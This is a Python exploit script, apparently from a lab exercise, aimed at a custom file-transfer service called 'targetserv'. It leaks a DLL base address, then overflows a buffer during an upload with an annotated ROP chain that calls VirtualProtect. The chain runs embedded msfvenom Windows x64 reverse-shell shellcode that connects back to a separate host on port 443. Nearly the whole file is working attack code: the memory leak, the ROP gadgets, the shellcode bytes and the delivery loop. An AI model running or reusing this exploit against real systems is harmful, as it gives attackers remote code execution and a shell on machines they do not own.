import socket
import os
from struct import pack, unpack

host = '192.168.1.120'
port = 9090
block_size = 16
remote_filename = 'Test.jpg'
local_send_path = r'C:\Temp\test.jpg'
local_recv_path = r'C:\Temp\received_test.jpg'
ACK_VALUE = 0xcacabecc

# Shellcode: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.121 LPORT=443 -b "\x00" -f py -v shellcode EXITFUNC=thread
shellcode  = b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x1b\x8d\xea"
shellcode += b"\x63\xb3\xae\x62\xde\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xe7\xc5\x69\x87\x43"
shellcode += b"\x46\xa2\xde\x1b\x8d\xab\x32\xf2\xfe\x30\x8f"
shellcode += b"\x4d\xc5\xdb\xb1\xd6\xe6\xe9\x8c\x7b\xc5\x61"
shellcode += b"\x31\xab\xe6\xe9\x8c\x3b\xc5\x61\x11\xe3\xe6"
shellcode += b"\x6d\x69\x51\xc7\xa7\x52\x7a\xe6\x53\x1e\xb7"
shellcode += b"\xb1\x8b\x1f\xb1\x82\x42\x9f\xda\x44\xe7\x22"
shellcode += b"\xb2\x6f\x80\x33\x49\xcc\xbb\x2b\x38\xfc\x42"
shellcode += b"\x55\x59\xb1\xa2\x62\x63\x25\xe2\x56\x1b\x8d"
shellcode += b"\xea\x2b\x36\x6e\x16\xb9\x53\x8c\x3a\x33\x38"
shellcode += b"\xe6\x7a\x9a\x90\xcd\xca\x2a\xb2\x7e\x81\x88"
shellcode += b"\x53\x72\x23\x22\x38\x9a\xea\x96\x1a\x5b\xa7"
shellcode += b"\x52\x7a\xe6\x53\x1e\xb7\xcc\x2b\xaa\xbe\xef"
shellcode += b"\x63\x1f\x23\x6d\x9f\x92\xff\xad\x2e\xfa\x13"
shellcode += b"\xc8\xd3\xb2\xc6\x76\x3a\x9a\x90\xcd\xce\x2a"
shellcode += b"\xb2\x7e\x04\x9f\x90\x81\xa2\x27\x38\xee\x7e"
shellcode += b"\x97\x1a\x5d\xab\xe8\xb7\x26\x2a\xdf\xcb\xcc"
shellcode += b"\xb2\x22\xeb\xf0\x3b\x84\x5a\xd5\xab\x3a\xf2"
shellcode += b"\xf4\x2a\x5d\xf7\xad\xab\x31\x4c\x4e\x3a\x9f"
shellcode += b"\x42\xd7\xa2\xe8\xa1\x47\x35\x21\xe4\x72\xb7"
shellcode += b"\x2a\x0d\xd9\x11\xec\x44\xbe\xd8\x63\xb3\xef"
shellcode += b"\x34\x97\x92\x6b\xa2\xe2\x5f\x0e\x63\xde\x1b"
shellcode += b"\xc4\x63\x86\xfa\x12\x60\xde\x1a\x36\x2a\xcb"
shellcode += b"\xb2\xd7\x23\x8a\x52\x04\x0e\x2f\x3a\x5f\x23"
shellcode += b"\x64\x57\xfa\xcc\x64\x4c\x7b\x2e\x57\xf1\xe5"
shellcode += b"\xeb\x62\xb3\xae\x3b\x9f\xa1\xa4\x6a\x08\xb3"
shellcode += b"\x51\xb7\x8e\x4b\xc0\xdb\xaa\xfe\x9f\xa2\x96"
shellcode += b"\xe4\x4d\xa2\xea\x71\xe6\x9d\x1e\x53\x04\x2b"
shellcode += b"\x22\x09\x44\x6d\x01\xfb\x72\x3f\x2b\x3a\x69"
shellcode += b"\x08\xce\x5a\xd5\xa6\xea\x51\xe6\xeb\x27\x5a"
shellcode += b"\x37\x73\xc6\xc7\xcf\x9d\x0b\x53\x0c\x2e\x23"
shellcode += b"\xb1\xae\x62\x97\xa3\xee\x87\x07\xb3\xae\x62"
shellcode += b"\xde\x1b\xcc\xba\x22\xe3\xe6\xeb\x3c\x4c\xda"
shellcode += b"\xbd\x2e\x82\x6e\x08\xd3\x42\xcc\xba\x81\x4f"
shellcode += b"\xc8\xa5\x9a\x3f\xd9\xeb\x62\xfb\x23\x26\xfa"
shellcode += b"\x03\x4b\xea\x0b\xfb\x27\x84\x88\x4b\xcc\xba"
shellcode += b"\x22\xe3\xef\x32\x97\xe4\x4d\xab\x33\xfa\x51"
shellcode += b"\xaa\x93\x92\x4c\xa6\xea\x72\xef\xd8\xa7\xd7"
shellcode += b"\xb2\x6c\x9c\x66\xe6\x53\x0c\x53\x72\x20\xe8"
shellcode += b"\xbd\xef\xd8\xd6\x9c\x90\x8a\x9c\x66\x15\x82"
shellcode += b"\xc3\x31\x87\xab\xd9\x15\x3b\xdf\x43\xe4\x58"
shellcode += b"\xa2\xe0\x77\x86\x5e\xd8\x67\x87\x6a\x98\x53"
shellcode += b"\xdb\x67\x65\x5c\x9e\x98\x0c\xd9\xae\x3b\x9f"
shellcode += b"\x92\x57\x15\xb6\xb3\xae\x62\xde"

def leak_dll_base(sock):
    # Prepare the attack buffer
    total_length = 100
    xor_val = 0xcacafece

    # Create the buffer: first 8 bytes (total length XOR xor_val), xor_val, opcode, data
    buffer = pack('<II', (total_length ^ xor_val), xor_val)  # First 2 DWORDs: total_length and xor_val
    buffer += pack('<I', 0x99)  # Add the opcode (0x99)

    data = b'A' * (total_length - 12)
    buffer += data  # Append the data to the buffer

    # Send the buffer
    sock.sendall(buffer)

    response = sock.recv(8)
    addr = unpack('<Q', response)[0]
    dllBase = addr - 16384
    return dllBase

def send_xfer_request(sock, operation, filename, block_size):
    """
    Send a file transfer request to targetserv.
    operation: 1 = upload, 2 = download
    filename: remote filename (max 39 chars + null terminator)
    """
    total_length = 60
    xor_val = 0xdeadbeef
    buffer = pack('<II', (total_length ^ xor_val), xor_val)
    buffer += pack('<I', 0x44)  # Opcode for XferRequest
    buffer += pack('<I', operation)

    filename_bytes = filename.encode('utf-8')[:39]
    filename_bytes += b'\x00' * (40 - len(filename_bytes))
    buffer += filename_bytes

    buffer += pack('<I', block_size)
    sock.sendall(buffer)

    # Wait for ACK after sending request
    ack = sock.recv(4)
    ack_value = unpack('<I', ack)[0]

    if ack_value != ACK_VALUE:
        print(f"[-] Unexpected ACK: {hex(ack_value)}. Expected: {hex(ACK_VALUE)}")
        return False
    else:
        print(f"[+] Xfer Operation of type {operation} acknowledged.")

    # Receive the File Id
    file_id = sock.recv(8)
    file_id = unpack('<Q', file_id)[0]

    return True

def send_file(sock, filepath, block_size):
    """
    Send a file to targetserv in block_size chunks.
    Each packet: <DWORD seq_num><DWORD data_len><data_len bytes>
    Ends with a packet where data_len == 0
    """
    with open(filepath, 'rb') as f:
        seq = 0
        while True:
            chunk = f.read(block_size)
            data_len = len(chunk)
            pkt = pack('<II', seq, data_len) + chunk
            wbytes = sock.sendall(pkt)

            # Receive ACK for the packet
            ack = sock.recv(4)
            ack_value = unpack('<I', ack)[0]
            if ack_value != ACK_VALUE:
                print(f"[-] Packet not acknowledged.\n")
                return False

            if data_len == 0:
                break
            seq += 1
    return True

def attack_send_file(sock, dllBase, block_size):
    rip = dllBase + 7778

    iatAddrVP = dllBase + 37720
    outputAddr = dllBase + 16672

    vp  = pack('<Q', 0x4545454545454545)    # VMA of VirtualProtect (to patch)
    vp += pack('<Q', 0x4646464646464646)    # Return Address from VirtualProtect (to patch)

    rop  = pack('<Q', dllBase + 0x229f)     # push rsp ; pop rcx ; ret ;
    rop += pack('<Q', dllBase + 0x2b9c)     # pop rax ; ret ;
    rop += pack('<Q', iatAddrVP)            # VMA of IAT location containing VP's VMA
    rop += pack('<Q', dllBase + 0x22a2)     # mov rax, qword [rax] ; ret ; -> RAX = VMA of VP
    rop += pack('<Q', dllBase + 0x22cd)     # mov r10, rax ; ret ; -> R10 = VMA of VP
    rop += pack('<Q', dllBase + 0x22a6)     # pop rbx ; ret ;
    rop += pack('<Q', 0xfffffffffffffe90)   # -304 = offset to Shellcode 
    rop += pack('<Q', dllBase + 0x22c0)     # sub rcx, rbx ; ret ; -> RCX = Shellcode Addr
    rop += pack('<Q', dllBase + 0x22c8)     # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = Shellcode Addr
    rop += pack('<Q', dllBase + 0x22d1)     # mov r11, rax ; ret ; -> R11 = lpAddress = Shellcode Addr 
    rop += pack('<Q', dllBase + 0x22a6)     # pop rbx ; ret ;
    rop += pack('<Q', 0xfffffffffffffce0)   # -800
    rop += pack('<Q', dllBase + 0x22b8)     # neg rbx ; ret ; -> RBX = 800
    rop += pack('<Q', dllBase + 0x22ac)     # mov rdx, rbx ; ret ; -> RDX = dwSize = 800
    rop += pack('<Q', dllBase + 0x22a6)     # pop rbx ; ret ;
    rop += pack('<Q', 0xffffffffffffffc0)   # -0x40
    rop += pack('<Q', dllBase + 0x22b8)     # neg rbx ; ret ; -> RBX = 0x40
    rop += pack('<Q', dllBase + 0x22b0)     # mov r8, rbx ; ret ; -> R8 = flNewProtect = 0x40
    rop += pack('<Q', dllBase + 0x22a6)     # pop rbx ; ret ;
    rop += pack('<Q', outputAddr)           # Writable unused address
    rop += pack('<Q', dllBase + 0x22b4)     # mov r9, rbx ; ret ; -> rR9 = lpflOldProtect
    rop += pack('<Q', dllBase + 0x229f)     # push rsp ; pop rcx ; ret ;
    rop += pack('<Q', dllBase + 0x22a6)     # pop rbx ; ret ;
    rop += pack('<Q', 0xffffffffffffff40)   # -192 = offset to VP Skeleton
    rop += pack('<Q', dllBase + 0x22bc)     # add rcx, rbx ; ret ; -> RCX = VP Skeleton
    rop += pack('<Q', dllBase + 0x22c8)     # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = VP Skeleton
    rop += pack('<Q', dllBase + 0x22dd)     # mov rcx, r10 ; ret ; -> RCX = VMA of VP
    rop += pack('<Q', dllBase + 0x22c4)     # mov qword [rax], rcx ; ret ; -> Patch VMA of VP
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e5)     # inc rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e1)     # mov rcx, r11 ; ret ; -> RCX = Return Addr = Shellcode Addr
    rop += pack('<Q', dllBase + 0x22c4)     # mov qword [rax], rcx ; ret ; -> Patch Return Addr of VP 
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ;
    rop += pack('<Q', dllBase + 0x22e9)     # dec rax ; ret ; -> RAX = VP Skeleton
    rop += pack('<Q', dllBase + 0x22ed)     # xchg rax, rsp ; ret ;

    payload = b"A" * 136 + vp +  rop + shellcode

    seq = 0
    offset = 0
    total_len = len(payload)

    while offset < total_len:
        chunk = payload[offset:offset + block_size]
        data_len = len(chunk)
        pkt = pack('<II', seq, data_len) + chunk
        sock.sendall(pkt)

        # Wait for ACK
        ack = sock.recv(4)
        ack_value = unpack('<I', ack)[0]
        if ack_value != ACK_VALUE:
            print(f"[-] Packet {seq} not acknowledged.")
            return False

        offset += block_size
        seq += 1

    # Send final packet with data_len == 0
    final_pkt = pack('<II', seq, 0)
    sock.sendall(final_pkt)

    # Final ACK
    ack = sock.recv(4)
    ack_value = unpack('<I', ack)[0]
    if ack_value != ACK_VALUE:
        print("[-] Final packet not acknowledged.")
        return False

    return True

def recv_file(sock, filepath):
    """
    Receive a file from targetserv and save it locally.
    Each packet: <DWORD seq_num><DWORD data_len><data_len bytes>
    Ends when data_len == 0
    """
    with open(filepath, 'wb') as f:
        expected_seq = 0
        while True:
            header = sock.recv(8)
            if len(header) < 8:
                print("[-] Incomplete packet header")
                break
            seq_num, data_len = unpack('<II', header)
            if data_len == 0:
                break
            data = b''
            while len(data) < data_len:
                part = sock.recv(data_len - len(data))
                if not part:
                    break
                data += part
            if seq_num != expected_seq:
                print(f"[-] Expected seq {expected_seq}, got {seq_num}")
                break
            f.write(data)
            expected_seq += 1
    return True

# Upload phase
with socket.create_connection((host, port)) as sock:
    dllBase = leak_dll_base(sock)
    print(f"[+] DllBase: {dllBase:08X}")

    if send_xfer_request(sock, 1, remote_filename, block_size):
        if attack_send_file(sock, dllBase, block_size):
            print(f"[+] File uploaded successfully.")

# Download phase
with socket.create_connection((host, port)) as sock:
    block_size = 1200
    if send_xfer_request(sock, 2, remote_filename, block_size):
        if recv_file(sock, local_recv_path):
            print(f"[+] File downloaded successfully.")

